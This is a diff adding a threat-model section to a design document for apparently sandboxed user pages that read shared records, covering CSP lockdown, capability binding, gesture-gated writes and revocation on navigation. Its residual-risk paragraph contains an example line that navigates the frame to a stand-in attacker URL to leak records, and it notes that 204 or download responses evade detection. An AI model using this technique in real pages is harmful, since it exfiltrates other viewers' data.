@@ -412,6 +412,64 @@ the threat model:
   interstitial via sandbox navigation restrictions would break legitimate
   in-artifact links, so this stands as an accepted, documented risk.
 
+### Shared records: pages that read records (threat model)
+
+A page reads and writes per-document shared records (`doc_records`,
+`scope: shared`; never the viewer's personal ones) only if its head says
+`<meta name="primer-records" content="read">`. Records are worth more than
+page content (votes, sign-ups, what other viewers typed), so such pages get
+everything the CSP and the host can take away:
+
+- **Complete outbound lockdown.** The content route reads the opt-in from the
+  stored page and serves it with `artifactCsp('records')`: no remote scripts,
+  styles, fonts or images (inline and `blob:` only), `connect-src`,
+  `form-action`, `frame-src`, `media-src` and `object-src` `'none'`,
+  `base-uri 'none'`. That closes the `img-src https:` channel.
+- **No bridge way out.** The host grants such pages the `records` feature
+  and drops their `open_external` (the companion stops forwarding link
+  clicks too). Until the host has learned the page's policy from the server
+  (`GET /api/versions/:versionId/page`, from the same stored bytes) it sends
+  no `init`, so the page has no port to call through.
+- **A document-bound capability.** The host binds records calls to the
+  page's own document; `args` are rebuilt from an allow-list, so a page can't
+  name another document. Pages get shared records only: the host refuses
+  `scope: "personal"`, and the server refuses it too for calls the host marks
+  (`x-primer-page-bridge`), and leaves personal changes out of a page's change
+  feed. The server decides access per viewer on every call (shared read:
+  readers; writes: owner, editor, responder). At most 8 calls in flight, 5 s
+  each, 256 KB per call, 200 records per page.
+- **Writes need a real gesture.** The host applies a page's write only while
+  the viewer's click or keypress inside the page's frame is live (transient
+  user activation, which the browser also sets on the host document when the
+  frame is clicked, and which page code cannot create) and the frame has
+  focus, so a click on Primer's own chrome does not count. The activation
+  window (about 5 s) can cover several writes from one click. Writes without it are
+  refused with `forbidden`.
+- **Navigation revokes.** A record-reading frame that loads a second time
+  navigated itself. The host revokes its record access at once (in-flight
+  calls fail, later ones are refused), closes its change feed and reloads the
+  page from Primer with a fresh capability (at most three times, then it
+  stays revoked).
+- **Checkpoints and shares are frozen.** A checkpoint keeps the shared
+  records of its moment (`records.json` in its bundle). Its page, in a
+  checkpoint view or an external share, is served with them in an inert JSON
+  script and the companion answers reads from it; writes are refused and the
+  host binds no live access. An external share carries only the collections
+  the page declares (`<meta name="primer-records-collections" content="…">`),
+  each record only its id and data: no writer identity, versions or times.
+  Personal records are never frozen.
+
+**Residual risk (accepted).** Nothing stops a sandboxed frame from
+navigating itself (`location.href = 'https://attacker/?d=…'`), and no CSP
+directive blocks it today. Whatever records the page had already read when it
+navigates can leave in that URL. Revocation is a reaction to the navigation's
+`load`, not a prevention: it bounds the leak to data read before the first
+navigation, as long as the navigation produces a `load` in the frame. A
+navigation answered with `204 No Content` or a download leaves the page in
+place and fires no `load`, so the host cannot see it and the page can repeat
+it. Treat any record a viewer can read as readable by any page they open on
+that document that opted in to records; keep secrets out of records.
+
 ### Anchor resolution & drift handling
 
 When a user makes a selection, the companion script generates an anchor with both text-range data (primary) and element-path data (for the containing element). On render, the script attempts text-range resolution first: find the unique occurrence of `prefix + selectorText + suffix` within the document. If that fails (text changed or duplicated), it falls back to element-path: locate the element by selector path and verify the inner-content hash. If that also fails, the anchor is marked "drifted" — the comment still appears in the sidebar with a small "this comment's location could not be determined" indicator, but no in-iframe marker.
